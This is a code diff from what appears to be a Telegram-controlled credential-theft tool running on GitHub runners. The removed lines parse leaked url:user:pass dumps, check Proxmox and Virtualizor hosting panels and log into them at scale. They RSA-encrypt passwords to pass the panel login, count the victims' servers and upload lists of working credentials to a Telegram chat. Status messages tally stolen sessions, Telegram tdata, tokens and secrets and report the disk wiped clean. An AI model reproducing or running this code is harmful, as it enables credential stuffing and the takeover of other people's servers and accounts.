-                        "📦 <b>Status:</b> Batch processed",
-                        f"🔧 <b>Mode:</b> <code>{mode}</code>",
-                        f"📁 <b>Files:</b> <code>{extra.get('files', 0)}</code>",
-                        f"💾 <b>Total size:</b> <code>{fs(extra.get('bytes', 0))}</code>",
-                    ]
-                    if extra.get("total"):
-                        lines.append(f"🔎 <b>Entries:</b> <code>{extra.get('total')}</code>")
-                    if extra.get("reach") is not None:
-                        lines.append(f"🌐 <b>Reachable:</b> <code>{extra.get('reach')}</code>")
-                    if extra.get("valid") is not None:
-                        lines.append(f"✅ <b>Valid:</b> <code>{extra.get('valid')}</code>")
-                    if extra.get("cookies"):
-                        lines.append(f"🍪 <b>Sessions:</b> <code>{extra.get('cookies')}</code>")
-                    lines.extend([
-                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
-                        f"🧹 <b>Disk:</b> Wiped clean",
-                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
-                    ])
-                elif is_vps:
-                    lines = [
-                        "✦ <b>Task Complete ✅</b>",
-                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-                        "📦 <b>Status:</b> VPS scan completed",
-                        f"🔎 <b>Total:</b> <code>{extra.get('total', 0)}</code>",
-                        f"🌐 <b>Reachable:</b> <code>{extra.get('reach', extra.get('valid', 0))}</code>",
-                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
-                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
-                    ]
-                else:
-                    cookies_cnt = extra.get("cookies", 0)
-                    sent_cnt = len(extra.get("sent") or [])
-                    lines = [
-                        "✦ <b>Task Complete ✅</b>",
-                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-                        "📦 <b>Status:</b> All files extracted & delivered",
-                        f"📤 <b>Files sent:</b> <code>{sent_cnt}</code>",
-                        f"🍪 <b>Sessions:</b> <code>{cookies_cnt}</code>",
-                    ]
-                    if extra.get("td_total"):
-                        lines.append(f"🗃 <b>Tdata:</b> <code>{extra['td_total']}</code>")
-                    if extra.get("tok_total"):
-                        lines.append(f"🎟 <b>Tokens:</b> <code>{extra['tok_total']}</code>")
-                    if extra.get("js_total"):
-                        lines.append(f"🗂 <b>JSON:</b> <code>{extra['js_total']}</code>")
-                    if extra.get("sec_total"):
-                        lines.append(f"🗝 <b>Secrets:</b> <code>{extra['sec_total']}</code>")
-                    lines.extend([
-                        f"🖥 <b>Runner:</b> <code>github-runner</code>",
-                        f"🧹 <b>Disk:</b> Wiped clean",
-                        f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
-                    ])
-                tg_post(TG_API + "sendMessage", tries=5, timeout=15, json={
-                    "chat_id": CHAT,
-                    "text": "\n".join(lines),
-                    "parse_mode": "HTML",
-                    "reply_markup": {
-                        "inline_keyboard": [
-                            [{"text": "« Back to Menu", "callback_data": "menu_home"}]
-                        ]
-                    }
-                })
-            except Exception as e:
-                sys.stdout.write("Send Task Complete err: %s\n" % e)
-                sys.stdout.flush()
-
     st(stage, 100 if stage == "done" else _state.get("pct", 0),
        job=task.get("job"), vm=SPECS,
        **{k: extra[k] for k in extra if k in ("err", "tried")})
@@ -2375,8 +1840,7 @@ def finish(task, stage, **extra):
                              "ck_total", "ck_live", "ck_prem", "ck_free",
                              "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies",
                              "total", "reach", "invalid", "unreach",
-                             "valid", "bad", "errors",
-                             "files", "bytes", "mode")})
+                             "valid", "bad", "errors")})
     payload["pubs"] = PB[3]
     report(payload)
     PB[1] = None
@@ -2508,316 +1972,6 @@ def vps_login(entry):
             time.sleep(1)                           # retry: fresh attempt after 1s
     return "error", note
 
-# ── Virtualizor (/vps_virtl, /vps_verify): same streamed scan as the proxmox one ──
-
-VIRTL_PANL = ":4083"
-# The dump mixes real panel lines with junk, so the regex stays strict on the
-# port and the credential shape, but the host part stays permissive.
-VIRTL_LINE = re.compile(
-    r"(https?://[^\s:]+:\d{1,5}(?:/[^\s:]*)?):([^/:\s]{1,64}):([^\s]{1,80})")
-VIRTL_HOST = re.compile(
-    r"^([a-zA-Z0-9.\-]+:\d{1,5})(?:/[^\s:]*)?:([^/:\s]{1,64}):([^\s]{1,80})")
-VIRTL_SPACE = re.compile(
-    r"^(?:panel\s+)?([a-zA-Z0-9.\-]+:\d{1,5})\s+([^\s:/]{1,64})\s+([^\s]{1,80})$")
-VIRTL_UA = "Mozilla/5.0 (Virtualizor checker)"
-VIRTL_TUNE = 64          # reachability threads
-VIRTL_CHECKS = 50        # login-check threads
-VIRTL_RETRY = 2          # extra attempts for network errors
-
-
-def virtl_parse_line(line):
-    """Return (url, user, pass) for one virtualizer line, or None.
-
-    Mirrors the Go ParseVPSEntries fallback chain so the same dump lines are
-    picked up by both engines."""
-    m = VIRTL_LINE.search(line)
-    if m:
-        host, u, p = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
-    else:
-        host = u = p = ""
-        for rx in (VIRTL_SPACE, VIRTL_HOST):
-            m2 = rx.search(line)
-            if m2:
-                host, u, p = m2.group(1).strip(), m2.group(2).strip(), m2.group(3).strip()
-                break
-        if not host:
-            parts = line.split(":")
-            if len(parts) >= 4:
-                p = parts[-1].strip()
-                u = parts[-2].strip()
-                host = ":".join(parts[:-2]).strip()
-    if not host or not u or not p:
-        return None
-    if not host.lower().startswith(("http://", "https://")):
-        host = "https://" + host
-    if VIRTL_PANL not in host:
-        return None
-    return host, u, p
-
-
-def virtl_hits(path):
-    """Streamed panel scan — the file is read line by line, so a 3.9 GB dump is
-    scanned with a few MB of RAM. Zip archives are unpacked and every inner file
-    is scanned the same way."""
-    with open(path, "rb") as fh:
-        magic = fh.read(4)
-    files = [str(path)]
-    if magic == b"PK\x03\x04":
-        exd = WORK / "virtlun"
-        try:
-            shutil.rmtree(exd, ignore_errors=True)
-            exd.mkdir(parents=True)
-            with zipfile.ZipFile(path) as z:
-                z.extractall(exd)
-            files = [os.path.join(root, fn)
-                     for root, _d, fns in os.walk(str(exd)) for fn in sorted(fns)]
-        except Exception:
-            files = [str(path)]
-    seen, hits = set(), []
-    anchor = VIRTL_PANL.encode()
-    for fp in files:
-        try:
-            fh = open(fp, "rb")
-        except Exception:
-            continue
-        with fh:
-            n = 0
-            for raw in fh:
-                n += 1
-                if n % 5_000_000 == 0:
-                    tick("scan", 96, msg="filtering the virtualizer lines (streamed)…",
-                         scanned=n, found=len(hits))
-                if anchor not in raw:
-                    continue
-                line = raw.decode("utf-8", "ignore")
-                got = virtl_parse_line(line)
-                if not got:
-                    continue
-                key = (got[0], got[1], got[2])
-                if key in seen:
-                    continue
-                seen.add(key)
-                hits.append(key)
-    return hits
-
-
-def virtl_base_url(url):
-    """Strip the path from a panel URL.
-
-    ULP dumps carry panel URLs that already point at a page
-    ("https://host:4083/sessXXXX/index.php"). Appending "/index.php" to those
-    yields "/index.php/index.php", which answers 404 with an HTML body and
-    breaks the JSON parse. The API always lives at the root of the host."""
-    try:
-        parts = urlsplit(url)
-        if not parts.netloc:
-            return url.rstrip("/")
-        return urlunsplit((parts.scheme, parts.netloc, "", "", "")).rstrip("/")
-    except Exception:
-        return url.rstrip("/")
-
-
-def virtl_endpoint(url):
-    """The JSON login endpoint for a panel."""
-    return virtl_base_url(url) + "/index.php?api=json&act=login"
-
-
-def _der_read(buf, pos):
-    """Read one DER TLV. Returns (tag, content, next_pos)."""
-    tag = buf[pos]
-    pos += 1
-    n = buf[pos]
-    pos += 1
-    if n & 0x80:
-        k = n & 0x7F
-        n = int.from_bytes(buf[pos:pos + k], "big")
-        pos += k
-    return tag, buf[pos:pos + n], pos + n
-
-
-def virtl_rsa_encrypt(pubkey_pem, password):
-    """Encrypt the password with the panel's RSA key, PKCS#1 v1.5.
-
-    The runner has no crypto library, so the padding and the modular
-    exponentiation are done by hand. The result is the base64 of the DER
-    ciphertext, which is what the panel's own JS sends."""
-    body = "".join(line.strip() for line in pubkey_pem.strip().splitlines()[1:-1])
-    der = base64.b64decode(body)
-    # SubjectPublicKeyInfo ::= SEQUENCE { algorithm, subjectPublicKey BIT STRING }
-    _tag, spki, _ = _der_read(der, 0)
-    _tag, _alg, p = _der_read(spki, 0)
-    _tag, bits, _ = _der_read(spki, p)
-    rsa = bits[1:]                      # drop the unused-bits byte
-    # RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
-    _tag, seq, _ = _der_read(rsa, 0)
-    _tag, mod_b, p = _der_read(seq, 0)
-    _tag, exp_b, _ = _der_read(seq, p)
-
-    n = int.from_bytes(mod_b, "big")
-    e = int.from_bytes(exp_b, "big")
-    k = (n.bit_length() + 7) // 8
-
-    msg = password.encode("utf-8")
-    if len(msg) > k - 11:
-        raise ValueError("password too long for the panel key")
-
-    ps_len = k - len(msg) - 3
-    pool = bytearray()
-    while len(pool) < ps_len:
-        pool += bytes(b for b in os.urandom(ps_len) if b != 0)
-    ps = bytes(pool[:ps_len])
-
-    em = b"\x00\x02" + ps + b"\x00" + msg
-    ct = pow(int.from_bytes(em, "big"), e, n)
-    return base64.b64encode(ct.to_bytes(k, "big")).decode()
-
-
-def virtl_probe(entry):
-    """('ok'|'invalid'|'dead', note) — is the panel up and really Virtualizor?"""
-    url, user, pwd = entry
-    endpoint = virtl_endpoint(url)
-    try:
-        r = requests.get(endpoint, timeout=8, verify=False, allow_redirects=True,
-                         headers={"User-Agent": VIRTL_UA})
-    except Exception as e:
-        return "dead", type(e).__name__
-    if r.status_code >= 500:
-        return "dead", "HTTP %s" % r.status_code
-    body = (r.text or "")[:20000]
-    server = (r.headers.get("Server") or "").lower()
-    try:
-        pk = ((r.json() or {}).get("pubkey") or "")
-    except Exception:
-        pk = ""
-    if "virtualizor" in server or "BEGIN PUBLIC KEY" in pk:
-        return "ok", "HTTP %s" % r.status_code
-    low = body.lower()
-    if "virtualizor" in low or "webvirt" in low:
-        return "ok", "HTTP %s" % r.status_code
-    return "invalid", "HTTP %s" % r.status_code
-
-
-def virtl_login(entry):
-    """('valid'|'bad'|'error', note, vps_count) — logs into one panel.
-
-    The panel answers 200 with JSON for every outcome, so the success signal is
-    the "redirect" field: a successful login returns the session path the
-    browser should follow ("/sessXXXX/index.php?"), a rejected login returns no
-    redirect at all.
-
-    A rejected login is never retried: the panel counts every failed attempt
-    against a quota and locks the account out after five."""
-    url, user, pwd = entry
-    endpoint = virtl_endpoint(url)
-    sess = requests.Session()
-    sess.verify = False
-    sess.headers.update({"User-Agent": VIRTL_UA,
-                         "X-Requested-With": "XMLHttpRequest"})
-
-    note = "no attempt"
-    for attempt in range(1 + VIRTL_RETRY):
-        pubkey = ""
-        try:
-            r = sess.get(endpoint, timeout=10)
-            try:
-                pubkey = ((r.json() or {}).get("pubkey") or "")
-            except Exception:
-                pubkey = ""
-        except Exception as e:
-            note = "%s: %s" % (type(e).__name__, str(e)[:60])
-            if attempt < VIRTL_RETRY:
-                time.sleep(1)
-            continue
-
-        payload = {"username": user, "password": pwd, "login": "1"}
-        if pubkey:
-            try:
-                payload["encrypted_password"] = virtl_rsa_encrypt(pubkey, pwd)
-            except Exception as e:
-                note = "encrypt: %s" % str(e)[:60]
-
-        try:
-            r = sess.post(endpoint, timeout=12, data=payload)
-        except Exception as e:
-            note = "%s: %s" % (type(e).__name__, str(e)[:60])
-            if attempt < VIRTL_RETRY:
-                time.sleep(1)
-            continue
-        if r.status_code >= 500:
-            note = "HTTP %s" % r.status_code
-            if attempt < VIRTL_RETRY:
-                time.sleep(1)
-            continue
-        try:
-            d = r.json() or {}
-        except Exception:
-            return "error", "unparseable response", 0
-
-        if d.get("error"):
-            err = d.get("error")
-            if isinstance(err, list):
-                err = "; ".join(str(x) for x in err)
-            return "bad", str(err)[:80], 0
-
-        if d.get("redirect"):
-            return "valid", "", virtl_count_vps(sess, url)
-
-        uid = str(d.get("uid") or "").strip()
-        uname = str(d.get("username") or "").strip()
-        if (uid.isdigit() and int(uid) > 0) or uname:
-            return "valid", "", virtl_count_vps(sess, url)
-
-        return "bad", "login rejected", 0
-    return "error", note, 0
-
-
-def virtl_count_vps(sess, base_url):
-    """How many virtual servers the account can see.
-
-    The panel reports the number in its "counts" object ("counts":{"vps":"1"}),
-    not in a list. The value is a string on every panel that was checked."""
-    endpoint = virtl_base_url(base_url) + "/index.php?api=json&act=vps"
-    try:
-        r = sess.get(endpoint, timeout=10)
-        if r.status_code >= 500:
-            return 0
-        d = r.json() or {}
-    except Exception:
-        return 0
-    counts = d.get("counts")
-    if isinstance(counts, dict):
-        raw = counts.get("vps")
-        if isinstance(raw, dict):
-            raw = raw.get("count")
-        try:
-            n = int(str(raw).strip())
-            if n > 0:
-                return n
-        except Exception:
-            pass
-    try:
-        return int(str(d.get("vps") or 0).strip())
-    except Exception:
-        return 0
-
-
-def write_working(path, entries, kind):
-    """Write the working credentials as a separate txt.
-
-    The report keeps every outcome so nothing is lost; this file holds only
-    the panels that actually accepted the login, in the same url:user:pass
-    shape the scan commands produce."""
-    if not entries:
-        return None
-    with open(path, "w", encoding="utf-8", errors="ignore") as fh:
-        fh.write("=== %s — WORKING CREDENTIALS ===\n" % kind)
-        fh.write("Count : %d\n" % len(entries))
-        fh.write("Date  : %s\n\n" % time.strftime("%Y-%m-%d %H:%M:%S"))
-        for e in entries:
-            fh.write("%s:%s:%s\n" % (e[0], e[1], e[2]))
-    return path
-
-
 def tg_pull(fid, path):
     """Download a Telegram document with the injected BOT_TOKEN."""
     r = requests.get(TG_API + "getFile", params={"file_id": fid}, timeout=30)
@@ -2896,12 +2050,8 @@ def process_vps(task):
         st("vps_pack", 99, total=len(hits), ok=len(ok))
         sent = upload(str(rf),
                       "VPS PROMOX — reachable %s/%s panels" % (len(ok), len(hits)))
-        wf = write_working(str(OUT / "vps_promox_working.txt"),
-                            [e for (e, _n) in ok], "VPS PROMOX")
-        sent2 = upload(wf, "✅ VPS PROMOX — %s working panels" % len(ok)) if wf else 0
         finish(task, "done", total=len(hits), reach=len(ok),
-               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
-               working=len(ok))
+               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0)
         return
 
     if kind == "vps_check":
@@ -2944,551 +2094,11 @@ def process_vps(task):
         sent = upload(str(rp),
                       "VPS CHECK — valid %s / bad %s / errors %s"
                       % (len(valid), len(bad), len(err)))
-        wf = write_working(str(OUT / "vps_check_working.txt"),
-                            [e for (e, _n) in valid], "VPS CHECK")
-        sent2 = upload(wf, "✅ VPS CHECK — %s working panels" % len(valid)) if wf else 0
         finish(task, "done", total=len(entries), valid=len(valid),
-               bad=len(bad), errors=len(err), sent=1 if sent else 0,
-               working=len(valid))
-        return
-
-    if kind == "vps_virtl":
-        if task.get("url"):
-            arc = download(task["url"])
-            if arc is None:
-                finish(task, "error", err=_state.get("err") or "download failed")
-                return
-            path = str(arc)
-        elif task.get("file_id"):
-            path = tg_pull(task["file_id"], str(WORK / "virtl_src.dat"))
-        else:
-            finish(task, "error", err="no source — send an ulp link or a file"); return
-        st("scan", 96, msg="filtering the virtualizer lines (streamed)…", file=Path(path).name)
-        hits = virtl_hits(path)
-        if not hits:
-            finish(task, "error", err="no virtualizer url:user:pass lines in the source")
-            return
-        st("vps_probe", 2, total=len(hits), ok=0, invalid=0, dead=0)
-        ok, inval, dead = [], [], []
-        done = [0]
-        def _probe(e):
-            res = virtl_probe(e)
-            done[0] += 1
-            (ok if res[0] == "ok" else inval if res[0] == "invalid" else dead).append((e, res[1]))
-            tick("vps_probe", _vps_pct(done[0], len(hits)),
-                 total=len(hits), ok=len(ok), invalid=len(inval), dead=len(dead),
-                 threads=VIRTL_TUNE,
-                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
-                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(hits) - done[0])),
-                 elapsed=ft(time.time() - t0))
-        with ThreadPoolExecutor(max_workers=VIRTL_TUNE) as ex:
-            list(ex.map(_probe, hits))
-        if stop():
-            finish(task, "cancelled"); return
-        rf = OUT / "vps_virtl_results.txt"
-        with open(rf, "w", encoding="utf-8", errors="ignore") as fh:
-            fh.write("=== VPS VIRTUALIZER SCAN — SUMMARY ===\n"
-                     "Extracted   : %d\n"
-                     "Reachable   : %d\n"
-                     "Not Virtualizor : %d\n"
-                     "Dead        : %d\n"
-                     "Date        : %s\n\n"
-                     "=== REACHABLE ===\n%s\n"
-                     "=== NOT VIRTUALIZOR ===\n%s\n"
-                     "=== DEAD / UNREACHABLE ===\n%s\n" % (
-                         len(hits), len(ok), len(inval), len(dead),
-                         time.strftime("%Y-%m-%d %H:%M:%S"),
-                         "".join("%s:%s:%s\n" % e for (e, _n) in ok),
-                         "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n)
-                                 for (e, n) in inval),
-                         "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n)
-                                 for (e, n) in dead)))
-        st("vps_pack", 99, total=len(hits), ok=len(ok))
-        sent = upload(str(rf),
-                      "VPS VIRTUALIZER — reachable %s/%s panels" % (len(ok), len(hits)))
-        wf = write_working(str(OUT / "vps_virtl_working.txt"),
-                            [e for (e, _n) in ok], "VPS VIRTUALIZER")
-        sent2 = upload(wf, "✅ VPS VIRTUALIZER — %s working panels" % len(ok)) if wf else 0
-        finish(task, "done", total=len(hits), reach=len(ok),
-               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
-               working=len(ok))
-        return
-
-    if kind == "vps_verify":
-        if task.get("url"):
-            arc = download(task["url"])
-            if arc is None:
-                finish(task, "error", err=_state.get("err") or "download failed")
-                return
-            path = str(arc)
-        elif task.get("file_id"):
-            path = tg_pull(task["file_id"], str(WORK / "virtl_verify_src.dat"))
-        else:
-            finish(task, "error", err="no source — send a results link or a file"); return
-        st("scan", 96, msg="filtering the virtualizer lines (streamed)…", file=Path(path).name)
-        entries = virtl_hits(path)
-        if not entries:
-            finish(task, "error", err="no virtualizer url:user:pass lines in that file")
-            return
-        st("vps_login", 2, total=len(entries), valid=0, bad=0, errors=0)
-        valid, bad, errl = [], [], []
-        done = [0]
-        def _check(e):
-            res = virtl_login(e)
-            done[0] += 1
-            (valid if res[0] == "valid" else bad if res[0] == "bad" else errl).append((e, res[1], res[2]))
-            tick("vps_login", _vps_pct(done[0], len(entries)),
-                 total=len(entries), valid=len(valid), bad=len(bad), errors=len(errl),
-                 threads=VIRTL_CHECKS,
-                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
-                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(entries) - done[0])),
-                 elapsed=ft(time.time() - t0))
-        with ThreadPoolExecutor(max_workers=VIRTL_CHECKS) as ex:
-            list(ex.map(_check, entries))
-        if stop():
-            finish(task, "cancelled"); return
-        rp = OUT / "vps_verify_results.txt"
-        withvps = [x for x in valid if x[2] > 0]
-        rp.write_text(
-            "=== VPS VIRTUALIZER VERIFY — SUMMARY ===\n"
-            "Entries : %d\nValid   : %d\nValid+VPS: %d\nBad     : %d\nErrors  : %d\n"
-            "Date    : %s\n\n=== VALID OK ===\n%s\n=== VALID WITH VPS (>0) ===\n%s\n"
-            "=== BAD ===\n%s\n=== ERROR ===\n%s\n" % (
-                len(entries), len(valid), len(withvps), len(bad), len(errl),
-                time.strftime("%Y-%m-%d %H:%M:%S"),
-                "".join("%s:%s:%s  (vps=%d)\n" % (e[0], e[1], e[2], v) for (e, _n, v) in valid),
-                "".join("%s:%s:%s  (vps=%d)\n" % (e[0], e[1], e[2], v) for (e, _n, v) in withvps),
-                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n, _v) in bad),
-                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n, _v) in errl)))
-        st("vps_pack", 99, total=len(entries), valid=len(valid))
-        sent = upload(str(rp),
-                      "VPS VIRTUALIZER VERIFY — valid %s / bad %s / errors %s"
-                      % (len(valid), len(bad), len(errl)))
-        wf = write_working(str(OUT / "vps_verify_working.txt"),
-                            [(e[0], e[1], e[2]) for (e, _n, _v) in valid],
-                            "VPS VIRTUALIZER VERIFY")
-        sent2 = upload(wf, "✅ VPS VIRTUALIZER — %s working panels" % len(valid)) if wf else 0
-        finish(task, "done", total=len(entries), valid=len(valid),
-               bad=len(bad), errors=len(errl), sent=1 if sent else 0,
-               working=len(valid))
+               bad=len(bad), errors=len(err), sent=1 if sent else 0)
         return
 
     finish(task, "error", err="unknown vps kind %r" % kind)
-
-# ── batch mode (/batch_files): many files, one operation over all of them ───
-
-BATCH_DL_WORKERS = 5      # files pulled at the same time
-BATCH_SCAN_WORKERS = 64   # panels probed at the same time
-
-
-
-def prefer_direct(url, fallback):
-    """Return the direct origin only when it actually answers.
-
-    Relay tasks carry a direct public-IP link plus the Cloudflare tunnel link
-    as a fallback. The tunnel meters every connection and caps a transfer
-    near 10 MB/s, while the direct path is limited only by the relay's own
-    uplink. A dead direct origin (IP moved, port filtered) must never break a
-    job, so it is probed first and the tunnel is used when the probe fails.
-    """
-    url = (url or "").strip()
-    fallback = (fallback or "").strip()
-    if not url or not fallback or fallback == url:
-        return url
-    # The relay's first chunk after a restart is slow: the MTProto
-    # connections are cold and every session resolves the document once, so
-    # one range request can take 10-20 s before the first byte arrives. A
-    # short probe would reject a healthy direct origin and send the whole job
-    # through the metered tunnel, so probe with patience and one retry. The
-    # range is 1 KiB because the relay answers it from the same first chunk a
-    # real download would fetch.
-    last = ""
-    for attempt in range(2):
-        try:
-            r = requests.get(url, headers={"Range": "bytes=0-1023",
-                                           "User-Agent": "Mozilla/5.0"},
-                             timeout=(10, 35), stream=True)
-            ok = r.status_code in (200, 206)
-            r.close()
-            if ok:
-                if attempt:
-                    sys.stdout.write("direct origin ok on retry\n")
-                return url
-            last = "HTTP %s" % r.status_code
-        except Exception as e:
-            last = str(e)[:80]
-        if attempt == 0:
-            time.sleep(2)
-    sys.stdout.write("direct origin failed (%s), using tunnel\n" % last)
-    sys.stdout.flush()
-    return fallback
-
-
-def batch_download(files):
-    """Download every file of the batch with BATCH_DL_WORKERS parallel threads.
-
-    One aggregate progress line is published for the whole set: bytes pulled,
-    the total size and how many files are already on disk."""
-    dest = WORK / "batch"
-    dest.mkdir(parents=True, exist_ok=True)
-    t0 = time.time()
-
-    total_bytes = 0
-    for spec in files:
-        try:
-            total_bytes += int(spec.get("size") or 0)
-        except Exception:
-            pass
-
-    lock = threading.Lock()
-    done_bytes = [0]
-    done_files = [0]
-    paths = [None] * len(files)
-    errors = {}
-    last_file = [None]
-    last_byte = [time.time()]
-    stop_pub = threading.Event()
-    # The rate the card shows: measured over the last couple of seconds.
-    cur_rate = [0.0]
-
-    def publisher():
-        """One aggregate progress line for the whole set.
-
-        It runs on its own thread: the Telegram call must never block a
-        download thread, and the card has to move while the bytes flow --
-        not only once a file is finished."""
-        last_got = [0.0]
-        last_at = [time.time()]
-        while not stop_pub.is_set():
-            with lock:
-                got = done_bytes[0]
-                fin = done_files[0]
-                cur = last_file[0]
-                idle = time.time() - last_byte[0]
-            el = max(0.001, time.time() - t0)
-            # The rate is measured over the last few seconds, not since the
-            # start: a cumulative average starts at zero and keeps dragging
-            # the reading down long after the link is running at full speed.
-            now = time.time()
-            rate = 0.0
-            if now - last_at[0] >= 1.0:
-                rate = max(0.0, (got - last_got[0]) / (now - last_at[0]))
-                last_got[0] = got
-                last_at[0] = now
-            cur_rate[0] = rate
-            note = ""
-            if got == 0 and idle > 15:
-                note = "no bytes yet (%.0fs) — waiting for the relay" % idle
-            if total_bytes:
-                pct = int(got * 68 // total_bytes)
-            else:
-                pct = int(fin * 68 // max(1, len(files)))
-            tick("batch_download", min(pct, 68),
-                 files_done=fin, files_total=len(files),
-                 got=fs(got), total=fs(total_bytes) if total_bytes else "?",
-                 speed=(fs(rate) + "/s") if rate > 0 else "-",
-                 elapsed=ft(el),
-                 file=cur or "",
-                 note=note,
-                 batch_files="%d/%d" % (fin, len(files)),
-                 batch_total=fs(total_bytes) if total_bytes else "?")
-            stop_pub.wait(2.0)
-
-    def one(idx, spec):
-        url = prefer_direct(spec.get("url"), spec.get("fallback_url"))
-        if not url:
-            return
-        name = spec.get("name") or ""
-        try:
-            src, fname, fsize, err = resolve(url)
-        except Exception as e:
-            errors[idx] = str(e)[:90]
-            return
-        if err:
-            errors[idx] = str(err)[:90]
-            return
-        if not fname:
-            fname = name or ("file_%d.bin" % (idx + 1))
-        if not fsize:
-            try:
-                fsize = int(spec.get("size") or 0)
-            except Exception:
-                fsize = 0
-        # every file gets its own slot, so two files with the same name never
-        # fight over the same path
-        safe = re.sub(r"[\\/:*?\"<>|]+", "_", fname)[:80]
-        out_name = "%02d_%s" % (idx + 1, safe)
-
-        def cb(n, _i=idx):
-            with lock:
-                done_bytes[0] += n
-                last_file[0] = out_name
-                last_byte[0] = time.time()
-
-        path = fast_parallel_dl(src, dest, out_name, fsize, t0, progress_cb=cb)
-        if path and os.path.isfile(path):
-            paths[idx] = path
-        else:
-            # The download did not complete. The file on disk has the right
-            # length but holes in it, so it must not be scanned.
-            try:
-                (dest / out_name).unlink(missing_ok=True)
-            except Exception:
-                pass
-            errors[idx] = "download incomplete"
-        with lock:
-            done_files[0] += 1
-            got = done_bytes[0]
-            fin = done_files[0]
-            last_file[0] = out_name
-        el = max(0.001, time.time() - t0)
-        pct = int(got * 68 // total_bytes) if total_bytes else int(fin * 68 // max(1, len(files)))
-        tick("batch_download", min(pct, 68),
-             files_done=fin, files_total=len(files),
-             got=fs(got), total=fs(total_bytes) if total_bytes else "?",
-             speed=(fs(cur_rate[0]) + "/s") if cur_rate[0] > 0 else "-",
-             elapsed=ft(el), file=out_name,
-             batch_files="%d/%d" % (fin, len(files)),
-             batch_total=fs(total_bytes) if total_bytes else "?")
-
-    st("batch_download", 2, files_done=0, files_total=len(files),
-       got=fs(0), total=fs(total_bytes) if total_bytes else "?",
-       speed="-", elapsed="0s",
-       batch_files="0/%d" % len(files),
-       batch_total=fs(total_bytes) if total_bytes else "?")
-
-    pub = threading.Thread(target=publisher, daemon=True)
-    pub.start()
-    # Tell the per-file downloader how many files share the connection
-    # budget, so "files x splits" stays inside the edge cap and the relay's
-    # chunk slots.
-    global _PARALLEL_FILES
-    _PARALLEL_FILES = max(1, min(len(files), BATCH_DL_WORKERS))
-    try:
-        with ThreadPoolExecutor(max_workers=BATCH_DL_WORKERS) as ex:
-            futs = [ex.submit(one, i, spec) for i, spec in enumerate(files)]
-            for f in as_completed(futs):
-                try:
-                    f.result()
-                except Exception as e:
-                    sys.stdout.write("batch download failed: %s\n" % e)
-                    sys.stdout.flush()
-    finally:
-        stop_pub.set()
-        time.sleep(0.1)
-    if stop():
-        return [], total_bytes, errors
-    got_paths = [p for p in paths if p]
-    return got_paths, total_bytes, errors
-
-
-def _batch_hits(paths, virtl=False):
-    """Panel lines of every file, deduplicated, with the file they came from."""
-    hits, seen = [], set()
-    for p in paths:
-        for e in (virtl_hits(p) if virtl else vps_hits(p)):
-            if e in seen:
-                continue
-            seen.add(e)
-            hits.append((os.path.basename(p), e))
-    return hits
-
-
-def batch_panels(task, paths, virtl=False, total_bytes=0):
-    """Scan every file for panels and probe them all — one combined report."""
-    t0 = time.time()
-    probe = virtl_probe if virtl else vps_probe
-    label = "VPS VIRTUALIZER" if virtl else "VPS PROMOX"
-
-    st("scan", 72, msg="filtering the panel lines (streamed)…",
-       files_total=len(paths))
-    found = _batch_hits(paths, virtl=virtl)
-    if not found:
-        finish(task, "error", err="no %s panel url:user:pass lines in the batch"
-               % ("virtualizer" if virtl else "proxmox"))
-        return
-
-    st("vps_probe", 74, total=len(found), ok=0, invalid=0, dead=0)
-    ok, inval, dead = [], [], []
-    done = [0]
-
-    def _probe(item):
-        src_file, e = item
-        res = probe(e)
-        done[0] += 1
-        (ok if res[0] == "ok" else inval if res[0] == "invalid" else dead).append((src_file, e, res[1]))
-        tick("vps_probe", 74 + done[0] * 24 // max(1, len(found)),
-             total=len(found), ok=len(ok), invalid=len(inval), dead=len(dead),
-             threads=BATCH_SCAN_WORKERS,
-             speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
-             eta=ft((time.time() - t0) / max(1, done[0]) * (len(found) - done[0])),
-             elapsed=ft(time.time() - t0))
-
-    with ThreadPoolExecutor(max_workers=BATCH_SCAN_WORKERS) as ex:
-        list(ex.map(_probe, found))
-    if stop():
-        finish(task, "cancelled")
-        return
-
-    rf = OUT / ("%s_results.txt" % ("vps_virtl" if virtl else "vps_promox"))
-    with open(rf, "w", encoding="utf-8", errors="ignore") as fh:
-        fh.write("=== %s — BATCH SUMMARY ===\n"
-                 "Files       : %d\n"
-                 "Extracted   : %d\n"
-                 "Reachable   : %d\n"
-                 "Not %s : %d\n"
-                 "Dead        : %d\n"
-                 "Date        : %s\n\n"
-                 "=== REACHABLE ===\n%s\n"
-                 "=== NOT %s ===\n%s\n"
-                 "=== DEAD / UNREACHABLE ===\n%s\n" % (
-                     label, len(paths), len(found), len(ok),
-                     "VIRTUALIZER" if virtl else "PROXMOX", len(inval), len(dead),
-                     time.strftime("%Y-%m-%d %H:%M:%S"),
-                     "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], src) for (src, e, _n) in ok),
-                     "VIRTUALIZER" if virtl else "PROXMOX",
-                     "".join("%s:%s:%s  (%s)  [%s]\n" % (e[0], e[1], e[2], n, src)
-                             for (src, e, n) in inval),
-                     "".join("%s:%s:%s  (%s)  [%s]\n" % (e[0], e[1], e[2], n, src)
-                             for (src, e, n) in dead)))
-
-    st("vps_pack", 99, total=len(found), ok=len(ok))
-    sent = upload(str(rf), "%s — reachable %s/%s panels from %s files"
-                  % (label, len(ok), len(found), len(paths)))
